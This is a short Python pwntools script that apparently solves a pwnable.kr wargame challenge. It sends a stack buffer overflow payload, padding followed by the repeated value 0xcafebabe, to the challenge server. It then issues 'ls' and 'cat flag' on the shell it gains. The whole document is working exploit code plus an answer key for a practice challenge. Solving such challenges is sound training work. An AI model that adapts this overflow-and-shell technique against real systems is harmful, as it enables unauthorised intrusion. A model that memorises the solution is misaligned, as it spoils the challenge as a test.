from pwn import *

r = remote('pwnable.kr', 9000)
exploit = "AAA" + "\xca\xbe\xba\xfe"*20 + "\n"
r.send(exploit)
r.send("ls\n")
print r.recv(1024)
r.send("cat flag\n")
print r.recv(1024)
print r.recv(1024)
print r.recv(1024)
